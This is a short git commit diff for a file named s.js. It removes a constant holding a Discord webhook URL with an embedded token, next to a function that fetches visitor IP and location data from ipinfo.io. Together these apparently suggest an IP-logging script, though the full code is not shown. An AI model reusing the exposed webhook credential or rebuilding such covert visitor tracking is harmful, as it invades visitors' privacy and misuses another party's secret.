927e2005742dfe96ac719882c0e11c08160bb76b
keikun1215 <95695144+keikun1215@users.noreply.github.com>
2022-08-22 19:28:40 +0900

    Update s.js

--- a/s.js
+++ a/s.js
@@ -1,4 +1,3 @@
-const tg = "https://discord.com/api/webhooks/1011218338040520735/PT5ESMv5pSUT-wcV9ZfYlecS2xAyoS9TSzFIkRYo5F1OMTs3vw_TKkmlUKLAP6HHjUgh"
 const koz = async (b) => {
   let res = await fetch("https://ipinfo.io?callback")
   let dat = await res.json()
